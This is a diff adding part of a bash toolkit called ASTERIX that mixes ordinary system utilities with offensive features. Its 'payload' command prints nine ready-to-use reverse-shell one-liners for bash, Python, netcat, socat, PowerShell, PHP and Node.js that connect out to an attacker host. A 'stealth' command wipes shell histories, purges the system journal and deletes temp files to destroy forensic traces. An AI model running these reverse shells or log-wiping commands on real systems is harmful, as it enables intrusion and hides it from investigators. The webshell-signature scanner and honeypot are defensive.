+cmd_logwatch() {
+    if run_native_bin "asterix-logwatch" "$@"; then
+        return 0
+    fi
+    echo -e "${C_CYAN}[*] Streaming security auth log...${C_RESET}"
+    tail -f /var/log/auth.log 2>/dev/null || tail -f /var/log/syslog 2>/dev/null || dmesg -w
+}
+
+cmd_firewall() {
+    echo -e "${C_CYAN}${C_BOLD}[*] ASTERIX Firewall & Packet Filtering Status:${C_RESET}\n"
+    if command -v ufw >/dev/null 2>&1; then
+        run_as_root ufw status verbose
+    elif command -v iptables >/dev/null 2>&1; then
+        run_as_root iptables -L -n -v --line-numbers
+    elif command -v nft >/dev/null 2>&1; then
+        run_as_root nft list ruleset
+    else
+        echo -e "${C_YELLOW}[!] No firewall utility (ufw/iptables/nft) found.${C_RESET}"
+    fi
+}
+
+cmd_audit() {
+    echo -e "${C_CYAN}${C_BOLD}[*] Running ASTERIX Security & Hardening Audit...${C_RESET}\n"
+    if command -v lynis >/dev/null 2>&1; then
+        run_as_root lynis audit system --quick
+    else
+        echo -e "${C_YELLOW}[*] Performing Quick Linux Permission & Hardening Check...${C_RESET}"
+        echo -e "  [1] World-Writable Files in /etc:"
+        find /etc -maxdepth 2 -perm -o+w 2>/dev/null || echo "None found"
+        echo -e "  [2] Unowned Files:"
+        find / -nouser 2>/dev/null | head -n 10 || echo "None found"
+        echo -e "\n${C_GREEN}[✔] Basic security check done.${C_RESET}"
+    fi
+}
+
+cmd_suid() {
+    echo -e "${C_CYAN}${C_BOLD}[*] Scanning for SUID / SGID Executables...${C_RESET}\n"
+    find / -perm -4000 -o -perm -2000 2>/dev/null | head -n 30
+}
+
+cmd_certs() {
+    local host="${1:-google.com}"
+    echo -e "${C_CYAN}${C_BOLD}[*] Checking SSL/TLS Certificate for ${host}:443...${C_RESET}\n"
+    openssl s_client -connect "${host}:443" -servername "$host" 2>/dev/null | openssl x509 -noout -text 2>/dev/null | grep -E "(Issuer|Subject|Not Before|Not After|DNS:)" || echo "Could not query cert"
+}
+
+# ---------------------------------------------------------------------
+# 4. Encoding, Decoding & Password Utilities
+# ---------------------------------------------------------------------
+
+cmd_b64enc() {
+    if [ -z "$1" ]; then
+        cat | base64
+    else
+        echo -n "$*" | base64
+    fi
+}
+
+cmd_b64dec() {
+    if [ -z "$1" ]; then
+        cat | base64 -d
+    else
+        echo -n "$*" | base64 -d
+    fi
+    echo ""
+}
+
+cmd_hexenc() {
+    if [ -z "$1" ]; then
+        cat | xxd -p
+    else
+        echo -n "$*" | xxd -p
+    fi
+}
+
+cmd_hexdec() {
+    if [ -z "$1" ]; then
+        cat | xxd -p -r
+    else
+        echo -n "$*" | xxd -p -r
+    fi
+    echo ""
+}
+
+cmd_genpass() {
+    local length="${1:-24}"
+    echo -e "${C_CYAN}${C_BOLD}[*] Generated High-Entropy Cryptographic Password (${length} chars):${C_RESET}"
+    local pass
+    pass=$(LC_ALL=C tr -dc 'A-Za-z0-9!@#$%^&*()_+~=' < /dev/urandom | head -c "$length")
+    echo -e "\n  ${C_GREEN}${C_BOLD}${pass}${C_RESET}\n"
+}
+
+cmd_entropy() {
+    local file="$1"
+    if [ -z "$file" ] || [ ! -f "$file" ]; then
+        echo -e "${C_RED}[!] Error: Valid file path required.${C_RESET}\nUsage: ax entropy <file>"
+        exit 1
+    fi
+    echo -e "${C_CYAN}${C_BOLD}[*] Measuring Shannon Entropy of ${file}...${C_RESET}"
+    python3 -c "
+import sys, math
+with open('$file', 'rb') as f:
+    byteArr = list(f.read())
+fileSize = len(byteArr)
+if fileSize == 0:
+    print('Empty file.')
+    sys.exit()
+freqList = [byteArr.count(b)/fileSize for b in range(256) if byteArr.count(b) > 0]
+ent = -sum([f * math.log2(f) for f in freqList])
+print(f'Entropy: {ent:.4f} / 8.0000')
+if ent > 7.2:
+    print('\033[38;5;196m[!] High Entropy: Binary appears encrypted, obfuscated, or compressed.\033[0m')
+else:
+    print('\033[38;5;46m[✔] Normal Entropy: Uncompressed plaintext or standard binary.\033[0m')
+"
+}
+
+# ---------------------------------------------------------------------
+# 5. System, Hardware & Monitoring
+# ---------------------------------------------------------------------
+
+cmd_cpu() {
+    echo -e "${C_CYAN}${C_BOLD}[*] ASTERIX CPU Hardware & Performance:${C_RESET}\n"
+    if command -v lscpu >/dev/null 2>&1; then
+        lscpu | grep -E "(Model name|Architecture|CPU\(s\)|CPU max MHz|Virtualization)"
+    else
+        grep "model name" /proc/cpuinfo 2>/dev/null | head -n 1
+        grep "cpu MHz" /proc/cpuinfo 2>/dev/null | head -n 1
+    fi
+    echo -e "\n${C_YELLOW}Load Average:${C_RESET} $(uptime | awk -F'load average:' '{print $2}')"
+}
+
+cmd_disk() {
+    echo -e "${C_CYAN}${C_BOLD}[*] Storage Volumes & Filesystem Utilization:${C_RESET}\n"
+    df -h -x tmpfs -x devtmpfs 2>/dev/null || df -h
+}
+
+cmd_mem() {
+    if run_native_bin "asterix-memview"; then
+        return 0
+    fi
+    echo -e "${C_CYAN}${C_BOLD}[*] ASTERIX Physical Memory Profile:${C_RESET}\n"
+    free -h
+}
+
+cmd_service() {
+    local action="${1:-status}"
+    local svc="$2"
+    if command -v systemctl >/dev/null 2>&1; then
+        if [ -n "$svc" ]; then
+            run_as_root systemctl "$action" "$svc"
+        else
+            systemctl list-units --type=service --state=running | head -n 25
+        fi
+    elif command -v service >/dev/null 2>&1; then
+        run_as_root service "$svc" "$action"
+    else
+        echo -e "${C_YELLOW}[!] Service manager not available.${C_RESET}"
+    fi
+}
+
+cmd_ps() {
+    echo -e "${C_CYAN}${C_BOLD}[*] ASTERIX Top Active Processes:${C_RESET}\n"
+    ps aux --sort=-%cpu | head -n 20
+}
+
+cmd_benchmark() {
+    echo -e "${C_CYAN}${C_BOLD}[*] Running ASTERIX Native CPU & Math Benchmark...${C_RESET}"
+    python3 -c "
+import time, math
+t0 = time.time()
+n = 2000000
+sum_val = sum(math.sqrt(i) for i in range(n))
+dt = time.time() - t0
+mops = (n / dt) / 1000000.0
+print(f'Computed {n:,} square roots in {dt:.3f}s ({mops:.2f} Mops/sec)')
+"
+    echo -e "${C_GREEN}[✔] Benchmark completed.${C_RESET}"
+}
+
+cmd_env() {
+    if run_native_bin "asterix-env-dump"; then
+        return 0
+    fi
+    echo -e "${C_CYAN}${C_BOLD}[*] ASTERIX Cyber Environment Dump:${C_RESET}\n"
+    env | grep -E "(ASTERIX|USER|SHELL|TERM|PATH|PERSIST)" || env | head -n 25
+}
+
+cmd_top() {
+    if command -v btop >/dev/null 2>&1; then
+        exec btop
+    elif command -v htop >/dev/null 2>&1; then
+        exec htop
+    else
+        exec top
+    fi
+}
+
+# ---------------------------------------------------------------------
+# 6. Vault, Workspace & Desktop HUD
+# ---------------------------------------------------------------------
+
+cmd_backup() {
+    local script
+    script=$(find_helper_script "backup-cloud.sh")
+    if [ -n "$script" ]; then
+        bash "$script" "$@"
+    else
+        echo -e "${C_RED}[!] backup-cloud.sh not found.${C_RESET}"
+    fi
+}
+
+cmd_loot() {
+    echo -e "${C_CYAN}${C_BOLD}[*] ASTERIX Persistent Loot & Intelligence Vault:${C_RESET}\n"
+    local vault_dir="/asterix_persistent/loot"
+    [ -d "$vault_dir" ] || vault_dir="${HOME}/asterix_persistent/loot"
+    [ -d "$vault_dir" ] || vault_dir="${HOME}/asterix_reports"
+
+    if [ -d "$vault_dir" ]; then
+        echo -e "${C_YELLOW}Location: ${vault_dir}${C_RESET}\n"
+        ls -la "$vault_dir"
+    else
+        echo -e "${C_GRAY}[i] No loot directory found. Loot is automatically collected during scans.${C_RESET}"
+    fi
+}
+
+cmd_scaffold() {
+    local script
+    script=$(find_helper_script "dev-bootstrap.sh")
+    if [ -n "$script" ]; then
+        bash "$script" "$@"
+    else
+        echo -e "${C_RED}[!] dev-bootstrap.sh not found.${C_RESET}"
+    fi
+}
+
+cmd_wallpaper() {
+    local wp_dir
+    local ax_root
+    ax_root=$(find_asterix_root)
+    wp_dir="${ax_root}/assets/wallpapers"
+    [ -d "$wp_dir" ] || wp_dir="/etc/asterix/assets/wallpapers"
+
+    if [ -d "$wp_dir" ]; then
+        local chosen
+        chosen=$(find "$wp_dir" -type f \( -name "*.png" -o -name "*.jpg" \) 2>/dev/null | shuf -n 1)
+        if [ -n "$chosen" ]; then
+            echo -e "${C_CYAN}[*] Setting wallpaper:${C_RESET} ${C_YELLOW}${chosen}${C_RESET}"
+            feh --bg-scale "$chosen" 2>/dev/null || true
+            if command -v xfconf-query >/dev/null 2>&1; then
+                xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor0/workspace0/last-image -s "$chosen" 2>/dev/null || true
+            fi
+            echo -e "${C_GREEN}[✔] Wallpaper updated!${C_RESET}"
+        fi
+    else
+        echo -e "${C_YELLOW}[!] Wallpapers directory not found.${C_RESET}"
+    fi
+}
+
+cmd_hud() {
+    local action="${1:-restart}"
+    local hud_conf="/etc/asterix/desktop-env/conky/asterix-hud.conkyrc"
+    [ -f "$hud_conf" ] || hud_conf="desktop-env/conky/asterix-hud.conkyrc"
+
+    case "$action" in
+        stop|off)
+            echo -e "${C_YELLOW}[*] Stopping ASTERIX HUD...${C_RESET}"
+            killall conky 2>/dev/null || true
+            echo -e "${C_GREEN}[✔] HUD terminated.${C_RESET}"
+            ;;
+        start|on)
+            echo -e "${C_CYAN}[*] Starting ASTERIX Cyber HUD Telemetry...${C_RESET}"
+            killall conky 2>/dev/null || true
+            if [ -f "$hud_conf" ] && command -v conky >/dev/null 2>&1; then
+                conky -c "$hud_conf" -d 2>/dev/null || true
+                echo -e "${C_GREEN}[✔] HUD started!${C_RESET}"
+            else
+                echo -e "${C_RED}[!] Conky or HUD config not available.${C_RESET}"
+            fi
+            ;;
+        restart|*)
+            echo -e "${C_CYAN}[*] Restarting ASTERIX HUD Overlay...${C_RESET}"
+            killall conky 2>/dev/null || true
+            if [ -f "$hud_conf" ] && command -v conky >/dev/null 2>&1; then
+                conky -c "$hud_conf" -d 2>/dev/null || true
+                echo -e "${C_GREEN}[✔] HUD active!${C_RESET}"
+            fi
+            ;;
+    esac
+}
+
+# ---------------------------------------------------------------------
+# 7. File, Search & Archive Utilities
+# ---------------------------------------------------------------------
+
+cmd_compress() {
+    local target="$1"
+    local archive="${2:-${target}.tar.gz}"
+    if [ -z "$target" ]; then
+        echo -e "${C_RED}[!] Error: Target required to compress.${C_RESET}\nUsage: ax compress <folder_or_file> [archive_name.tar.gz]"
+        exit 1
+    fi
+    echo -e "${C_CYAN}[*] Compressing ${target} into ${archive}...${C_RESET}"
+    tar -czf "$archive" "$target"
+    echo -e "${C_GREEN}[✔] Archive created: ${archive}${C_RESET}"
+}
+
+cmd_extract() {
+    local archive="$1"
+    if [ -z "$archive" ] || [ ! -f "$archive" ]; then
+        echo -e "${C_RED}[!] Error: Archive file not found.${C_RESET}\nUsage: ax extract <archive_file>"
+        exit 1
+    fi
+    echo -e "${C_CYAN}[*] Extracting ${archive}...${C_RESET}"
+    case "$archive" in
+        *.tar.bz2|*.tbz2) tar -xjf "$archive" ;;
+        *.tar.gz|*.tgz)   tar -xzf "$archive" ;;
+        *.tar.xz)         tar -xJf "$archive" ;;
+        *.tar)            tar -xf "$archive" ;;
+        *.zip)            unzip "$archive" ;;
+        *)                echo -e "${C_RED}[!] Unrecognized archive format.${C_RESET}" ;;
+    esac
+    echo -e "${C_GREEN}[✔] Extracted successfully.${C_RESET}"
+}
+
+cmd_find_large() {
+    local dir="${1:-.}"
+    echo -e "${C_CYAN}${C_BOLD}[*] Top 15 Largest Files in ${dir}:${C_RESET}\n"
+    find "$dir" -type f -exec du -h {} + 2>/dev/null | sort -rh | head -n 15
+}
+
+# ---------------------------------------------------------------------
+# 8. Elite Cyber Warfare, Anti-Forensics, Deception & Tactical Ops
+# ---------------------------------------------------------------------
+
+cmd_matrix() {
+    echo -e "${C_GREEN}[*] Initializing Cybernetic Neural Stream (Press 'q' or Ctrl+C to disconnect)...${C_RESET}"
+    sleep 0.5
+    local lines cols
+    lines=$(tput lines 2>/dev/null || echo 24)
+    cols=$(tput cols 2>/dev/null || echo 80)
+    
+    echo -ne "\033[?25l"
+    trap 'echo -ne "\033[?25h\033[0m\033[2J\033[H"; return 0' INT TERM EXIT
+    
+    clear
+    local chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%&*+-=<>{}[]"
+    local char_len=${#chars}
+    
+    declare -A y
+    for ((i=0; i<cols; i+=2)); do
+        y[$i]=$((RANDOM % lines))
+    done
+    
+    local count=0
+    while true; do
+        for ((x=0; x<cols; x+=2)); do
+            local current_y=${y[$x]:-1}
+            local rand_idx=$((RANDOM % char_len))
+            local rand_char="${chars:$rand_idx:1}"
+            
+            # White leading head
+            echo -ne "\033[${current_y};${x}H\033[38;5;231m\033[1m${rand_char}"
+            
+            # Glowing green trailer
+            if [ "$current_y" -gt 1 ]; then
+                local prev_y=$((current_y - 1))
+                echo -ne "\033[${prev_y};${x}H\033[38;5;46m${chars:$((RANDOM % char_len)):1}"
+            fi
+            # Dim emerald trailer
+            if [ "$current_y" -gt 4 ]; then
+                local trail_y=$((current_y - 4))
+                echo -ne "\033[${trail_y};${x}H\033[38;5;28m${chars:$((RANDOM % char_len)):1}"
+            fi
+            # Clear old tail
+            if [ "$current_y" -gt 12 ]; then
+                local clear_y=$((current_y - 12))
+                echo -ne "\033[${clear_y};${x}H "
+            fi
+            
+            y[$x]=$(( (current_y + 1) % lines ))
+            if [ "${y[$x]}" -eq 0 ]; then
+                for ((c=1; c<=lines; c++)); do
+                    echo -ne "\033[${c};${x}H "
+                done
+                y[$x]=1
+            fi
+        done
+        
+        read -t 0.05 -n 1 key 2>/dev/null || true
+        if [ "$key" = "q" ] || [ "$key" = "Q" ]; then
+            break
+        fi
+        
+        count=$((count + 1))
+        if [ "$count" -ge 600 ]; then
+            if [ ! -t 0 ]; then break; fi
+        fi
+    done
+    
+    echo -ne "\033[?25h\033[0m\033[2J\033[H"
+    echo -e "${C_CYAN}[✔] Neural stream disconnected.${C_RESET}"
+}
+
+cmd_stealth() {
+    echo -e "${C_RED}${C_BOLD}[!] INITIATING ASTERIX GHOST MODE (ANTI-FORENSICS)...${C_RESET}\n"
+    
+    echo -e "${C_CYAN}[1/6] Purging volatile memory and temporary directories...${C_RESET}"
+    run_as_root rm -rf /tmp/* /var/tmp/* /dev/shm/* 2>/dev/null || true
+    echo -e "${C_GREEN}      [✔] /tmp, /var/tmp, /dev/shm wiped.${C_RESET}"
+    
+    echo -e "${C_CYAN}[2/6] Shredding shell command histories...${C_RESET}"
+    history -c 2>/dev/null || true
+    [ -f "$HOME/.bash_history" ] && shred -u -n 3 "$HOME/.bash_history" 2>/dev/null || rm -f "$HOME/.bash_history"
+    [ -f "$HOME/.zsh_history" ] && shred -u -n 3 "$HOME/.zsh_history" 2>/dev/null || rm -f "$HOME/.zsh_history"
+    [ -f "$HOME/.history" ] && rm -f "$HOME/.history" 2>/dev/null || true
+    export HISTFILE=/dev/null
+    export HISTSIZE=0
+    set +o history 2>/dev/null || true
+    echo -e "${C_GREEN}      [✔] Shell history obliterated. HISTFILE=/dev/null active.${C_RESET}"
+    
+    echo -e "${C_CYAN}[3/6] Purging systemd journal logs & auth caches...${C_RESET}"
+    if command -v journalctl >/dev/null 2>&1; then
+        run_as_root journalctl --rotate 2>/dev/null || true
+        run_as_root journalctl --vacuum-time=1s 2>/dev/null || true
+    fi
+    echo -e "${C_GREEN}      [✔] System journal rotated and purged.${C_RESET}"
+    
+    echo -e "${C_CYAN}[4/6] Flushing DNS resolver caches...${C_RESET}"
+    if command -v resolvectl >/dev/null 2>&1; then
+        run_as_root resolvectl flush-caches 2>/dev/null || true
+    elif command -v systemd-resolve >/dev/null 2>&1; then
+        run_as_root systemd-resolve --flush-caches 2>/dev/null || true
+    fi
+    echo -e "${C_GREEN}      [✔] DNS caches flushed.${C_RESET}"
+    
+    echo -e "${C_CYAN}[5/6] Clearing clipboard and screen buffers...${C_RESET}"
+    if command -v xclip >/dev/null 2>&1; then
+        echo -n "" | xclip -selection clipboard 2>/dev/null || true
+        echo -n "" | xclip -selection primary 2>/dev/null || true
+    fi
+    echo -e "${C_GREEN}      [✔] Clipboard scrubbed.${C_RESET}"
+    
+    echo -e "${C_CYAN}[6/6] Syncing disk and clearing RAM pagecache...${C_RESET}"
+    run_as_root sync
+    if [ -w "/proc/sys/vm/drop_caches" ]; then
+        run_as_root sh -c 'echo 3 > /proc/sys/vm/drop_caches' 2>/dev/null || true
+    fi
+    echo -e "${C_GREEN}      [✔] Memory buffers cleared.${C_RESET}"
+    
+    echo -e "\n${C_PURPLE}${C_BOLD}[★] GHOST MODE ENGAGED. Digital footprint scrubbed.${C_RESET}\n"
+}
+
+cmd_killswitch() {
+    local action="${1:-engage}"
+    if [ "$action" = "--restore" ] || [ "$action" = "restore" ] || [ "$action" = "off" ]; then
+        echo -e "${C_CYAN}[*] Disengaging Killswitch: Restoring network stack...${C_RESET}"
+        if command -v iptables >/dev/null 2>&1; then
+            run_as_root iptables -P INPUT ACCEPT 2>/dev/null || true
+            run_as_root iptables -P FORWARD ACCEPT 2>/dev/null || true
+            run_as_root iptables -P OUTPUT ACCEPT 2>/dev/null || true
+            run_as_root iptables -F 2>/dev/null || true
+        fi
+        if command -v nmcli >/dev/null 2>&1; then
+            run_as_root nmcli networking on 2>/dev/null || true
+        fi
+        echo -e "${C_GREEN}[✔] Network stack restored to normal operational state.${C_RESET}"
+        return 0
+    fi
+
+    echo -e "${C_RED}${C_BOLD}"
+    cat << 'EOF'
+    ███████╗███╗   ███╗███████╗██████╗  ██████╗ ███████╗███╗   ██╗ ██████╗██╗   ██╗
+    ██╔════╝████╗ ████║██╔════╝██╔══██╗██╔════╝ ██╔════╝████╗  ██║██╔════╝╚██╗ ██╔╝
+    █████╗  ██╔████╔██║█████╗  ██████╔╝██║  ███╗█████╗  ██╔██╗ ██║██║      ╚████╔╝ 
+    ██╔══╝  ██║╚██╔╝██║██╔══╝  ██╔══██╗██║   ██║██╔══╝  ██║╚██╗██║██║       ╚██╔╝  
+    ███████╗██║ ╚═╝ ██║███████╗██║  ██║╚██████╔╝███████╗██║ ╚████║╚██████╗   ██║   
+    ╚══════╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝ ╚═════╝   ╚═╝   
+EOF
+    echo -e "              >> EMERGENCY DEFENSE LOCKDOWN ENGAGED <<${C_RESET}\n"
+    
+    echo -e "${C_YELLOW}[!] Severing all network interfaces...${C_RESET}"
+    if command -v nmcli >/dev/null 2>&1; then
+        run_as_root nmcli networking off 2>/dev/null || true
+    fi
+    for iface in $(ip -o link show 2>/dev/null | awk -F': ' '{print $2}' | grep -v 'lo'); do
+        run_as_root ip link set "$iface" down 2>/dev/null || true
+    done
+    
+    echo -e "${C_YELLOW}[!] Dropping all IP packets (INPUT/FORWARD/OUTPUT -> DROP)...${C_RESET}"
+    if command -v iptables >/dev/null 2>&1; then
+        run_as_root iptables -P INPUT DROP 2>/dev/null || true
+        run_as_root iptables -P FORWARD DROP 2>/dev/null || true
+        run_as_root iptables -P OUTPUT DROP 2>/dev/null || true
+    fi
+
+    echo -e "${C_YELLOW}[!] Terminating active remote sessions (SSH/Telnet)...${C_RESET}"
+    pkill -9 sshd 2>/dev/null || true
+    
+    echo -e "\n${C_RED}${C_BOLD}[☠] SYSTEM ISOLATED. All RF & Ethernet links severed.${C_RESET}"
+    echo -e "${C_GRAY}To restore network connectivity, execute: ${C_WHITE}ax killswitch restore${C_RESET}\n"
+}
+
+cmd_decoy() {
+    local port="${1:-8080}"
+    local logfile="./loot/decoy-${port}.log"
+    mkdir -p "./loot" 2>/dev/null || logfile="/tmp/asterix-decoy-${port}.log"
+    
+    echo -e "${C_YELLOW}${C_BOLD}[*] DEPLOYING ASTERIX HONEYPOT DECOY ON PORT: ${C_WHITE}${port}${C_RESET}"
+    echo -e "${C_GRAY}Logging intrusion attempts to: ${logfile}${C_RESET}"
+    echo -e "${C_CYAN}[*] Waiting for incoming adversary connections (Ctrl+C to stop)...${C_RESET}\n"
+    
+    if command -v python3 >/dev/null 2>&1; then
+        python3 -c "
+import socket, sys, datetime
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+try:
+    s.bind(('0.0.0.0', int('$port')))
+    s.listen(5)
+    while True:
+        conn, addr = s.accept()
+        now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        print(f'\033[38;5;196m\033[1m[ALERT] INTRUSION DETECTED from {addr[0]}:{addr[1]} at {now}!\033[0m')
+        data = conn.recv(1024)
+        banner = b'SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1\r\n' if '$port' == '22' else b'HTTP/1.1 200 OK\r\nServer: Apache/2.4.41 (Ubuntu)\r\nContent-Length: 0\r\n\r\n'
+        conn.sendall(banner)
+        payload_preview = data.decode('utf-8', errors='replace')[:120].strip()
+        print(f'\033[38;5;220m  Payload: {payload_preview}\033[0m')
+        with open('$logfile', 'a') as f:
+            f.write(f'[{now}] Source: {addr[0]}:{addr[1]} | Payload: {payload_preview}\n')
+        conn.close()
+except KeyboardInterrupt:
+    print('\n\033[38;5;46m[*] Honeypot deactivated.\033[0m')
+    s.close()
+"
+    elif command -v nc >/dev/null 2>&1; then
+        while true; do
+            echo -e "${C_RED}[*] Honeypot listener active on port ${port}...${C_RESET}"
+            nc -l -v -p "$port" 2>&1 | tee -a "$logfile"
+        done
+    else
+        echo -e "${C_RED}[!] Python3 or netcat required to deploy honeypot.${C_RESET}"
+    fi
+}
+
+cmd_payload() {
+    local lhost="${1:-10.0.0.1}"
+    local lport="${2:-4444}"
+    
+    echo -e "${C_CYAN}${C_BOLD}ASTERIX CYBERNETIC REVERSE SHELL & PAYLOAD GENERATOR${C_RESET}"
+    echo -e "Target LHOST: ${C_YELLOW}${lhost}${C_RESET} | LPORT: ${C_YELLOW}${lport}${C_RESET}\n"
+    
+    echo -e "${C_WHITE}${C_BOLD}[1] Bash (TCP Interactive):${C_RESET}"
+    echo -e "${C_GREEN}bash -i >& /dev/tcp/${lhost}/${lport} 0>&1${C_RESET}\n"
+    
+    echo -e "${C_WHITE}${C_BOLD}[2] Bash (Readline 5 /exec):${C_RESET}"
+    echo -e "${C_GREEN}0<&196;exec 196<>/dev/tcp/${lhost}/${lport}; sh <&196 >&196 2>&196${C_RESET}\n"
+    
+    echo -e "${C_WHITE}${C_BOLD}[3] Python3 (PTY Spawn):${C_RESET}"
+    echo -e "${C_GREEN}python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"${lhost}\",${lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'${C_RESET}\n"
+    
+    echo -e "${C_WHITE}${C_BOLD}[4] Netcat Traditional (-e):${C_RESET}"
+    echo -e "${C_GREEN}nc -e /bin/bash ${lhost} ${lport}${C_RESET}\n"
+    
+    echo -e "${C_WHITE}${C_BOLD}[5] Netcat OpenBSD (mkfifo):${C_RESET}"
+    echo -e "${C_GREEN}rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${lhost} ${lport} >/tmp/f${C_RESET}\n"
+    
+    echo -e "${C_WHITE}${C_BOLD}[6] Socat Encrypted/TTY:${C_RESET}"
+    echo -e "${C_GREEN}socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${lhost}:${lport}${C_RESET}\n"
+    
+    echo -e "${C_WHITE}${C_BOLD}[7] PowerShell (Windows Cross-Target):${C_RESET}"
+    echo -e "${C_GREEN}\$c=New-Object System.Net.Sockets.TCPClient('${lhost}',${lport});\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){\$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0,\$i);\$r=(iex \$d 2>&1 | Out-String );\$r2=\$r+'PS '+(pwd).Path+'> ';\$s2=([text.encoding]::ASCII).GetBytes(\$r2);\$s.Write(\$s2,0,\$s2.Length);\$s.Flush()};\$c.Close()${C_RESET}\n"
+    
+    echo -e "${C_WHITE}${C_BOLD}[8] PHP Execution:${C_RESET}"
+    echo -e "${C_GREEN}php -r '\$sock=fsockopen(\"${lhost}\",${lport});exec(\"/bin/bash -i <&3 >&3 2>&3\");'${C_RESET}\n"
+
+    echo -e "${C_WHITE}${C_BOLD}[9] Node.js:${C_RESET}"
+    echo -e "${C_GREEN}(function(){var net=require(\"net\"),cp=require(\"child_process\"),sh=cp.spawn(\"/bin/sh\",[]);var client=new net.Socket();client.connect(${lport},\"${lhost}\",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();${C_RESET}\n"
+    
+    echo -e "${C_CYAN}[i] To catch incoming shell on this host: ${C_YELLOW}ax ports${C_RESET} or ${C_YELLOW}nc -lvnp ${lport}${C_RESET}\n"
+}
+
+cmd_subdomains() {
+    local domain="$1"
+    if [ -z "$domain" ]; then
+        echo -e "${C_RED}[!] Error: Target domain required.${C_RESET}\nUsage: ax subdomains <example.com>"
+        exit 1
+    fi
+    echo -e "${C_CYAN}${C_BOLD}[*] Querying Certificate Transparency (crt.sh) for subdomains of: ${C_WHITE}${domain}${C_RESET}\n"
+    
+    local results
+    results=$(curl -s "https://crt.sh/?q=%25.${domain}&output=json" 2>/dev/null | grep -o '"name_value": *"[^"]*"' | cut -d'"' -f4 | sed 's/\\n/\n/g' | grep -v '^\*' | sort -u || true)
+    
+    if [ -z "$results" ]; then
+        echo -e "${C_YELLOW}[!] No subdomains identified via crt.sh or network connection unavailable.${C_RESET}"
+    else
+        local count
+        count=$(echo "$results" | wc -l)
+        echo -e "${C_GREEN}[✔] Discovered ${count} unique subdomains:${C_RESET}\n"
+        echo "$results" | while read -r sub; do
+            [ -z "$sub" ] && continue
+            local ip
+            ip=$(dig +short "$sub" 2>/dev/null | head -n 1 || true)
+            if [ -n "$ip" ]; then
+                echo -e "  ${C_CYAN}➜${C_RESET} ${C_WHITE}${sub}${C_RESET} -> ${C_GREEN}${ip}${C_RESET}"
+            else
+                echo -e "  ${C_GRAY}➜ ${sub}${C_RESET}"
+            fi
+        done
+    fi
+    echo ""
+}
+
+cmd_wifi_scan() {
+    echo -e "${C_CYAN}${C_BOLD}[*] SCANNING WIRELESS SPECTRUM & ACCESS POINTS...${C_RESET}\n"
+    if command -v nmcli >/dev/null 2>&1; then
+        echo -e "${C_YELLOW}Scanning via NetworkManager...${C_RESET}"
+        nmcli -f SSID,BSSID,CHAN,FREQ,SIGNAL,SECURITY dev wifi list --rescan yes 2>/dev/null || nmcli dev wifi list
+    elif command -v iwlist >/dev/null 2>&1; then
+        local iface
+        iface=$(iw dev 2>/dev/null | grep Interface | awk '{print $2}' | head -n 1)
+        [ -z "$iface" ] && iface="wlan0"
+        echo -e "${C_YELLOW}Scanning via iwlist on ${iface}...${C_RESET}"
+        run_as_root iwlist "$iface" scan 2>/dev/null | grep -E 'ESSID|Address|Quality|Encryption'
+    else
+        echo -e "${C_RED}[!] Wireless tools (nmcli/iw/iwlist) not detected or wireless interface unavailable.${C_RESET}"
+    fi
+}
+
+cmd_malware_scan() {
+    local target_dir="${1:-.}"
+    echo -e "${C_RED}${C_BOLD}[*] INITIATING TACTICAL WEBSHELL & MALWARE SIGNATURE AUDIT in: ${C_WHITE}${target_dir}${C_RESET}\n"
+    
+    local found=0
+    echo -e "${C_CYAN}[1/4] Scanning for Obfuscated PHP Evals / Base64 Loaders...${C_RESET}"
+    local p_evals
+    p_evals=$(grep -rnEI "eval\(.*base64_decode" "$target_dir" 2>/dev/null | head -n 10 || true)
+    if [ -n "$p_evals" ]; then
+        echo -e "${C_RED}[ALERT] Found potential webshell base64 evals:${C_RESET}"
+        echo "$p_evals"
+        found=$((found + 1))
+    else
+        echo -e "${C_GREEN}      [✔] No base64 decode evals detected.${C_RESET}"
+    fi
+    
+    echo -e "${C_CYAN}[2/4] Scanning for Web Command Wrappers (system, shell_exec, passthru)...${C_RESET}"
+    local p_execs
+    p_execs=$(grep -rnEI "(shell_exec|passthru|system\(\$_GET|system\(\$_POST)" "$target_dir" 2>/dev/null | head -n 10 || true)
+    if [ -n "$p_execs" ]; then
+        echo -e "${C_RED}[ALERT] Found raw command execution entry points:${C_RESET}"
+        echo "$p_execs"
+        found=$((found + 1))
+    else
+        echo -e "${C_GREEN}      [✔] Clean.${C_RESET}"
+    fi
+    
+    echo -e "${C_CYAN}[3/4] Scanning for Hidden / World-Writable Binaries...${C_RESET}"
+    local p_hidden
+    p_hidden=$(find "$target_dir" -type f -name ".*" -perm /111 2>/dev/null | head -n 10 || true)
+    if [ -n "$p_hidden" ]; then
+        echo -e "${C_YELLOW}[!] Discovered hidden executable files:${C_RESET}"
+        echo "$p_hidden"
+    else
+        echo -e "${C_GREEN}      [✔] Clean.${C_RESET}"
+    fi
+    
+    echo -e "${C_CYAN}[4/4] Auditing Local Cron Schedules & System Timers...${C_RESET}"
+    if [ -r "/etc/crontab" ]; then
+        grep -v '^#' /etc/crontab | grep -v '^$' || true
+    fi
+    crontab -l 2>/dev/null || true
+    
+    echo -e "\n${C_BOLD}Audit complete: ${found} potential security alerts flagged.${C_RESET}\n"
+}
+
+cmd_exif() {
+    local target="$1"
+    local opt="${2:-}"
+    if [ -z "$target" ]; then
+        echo -e "${C_RED}[!] Error: File required.${C_RESET}\nUsage: ax exif <file.jpg|pdf> [--strip]"
+        exit 1
+    fi
+    
+    if [ "$opt" = "--strip" ] || [ "$opt" = "-s" ]; then
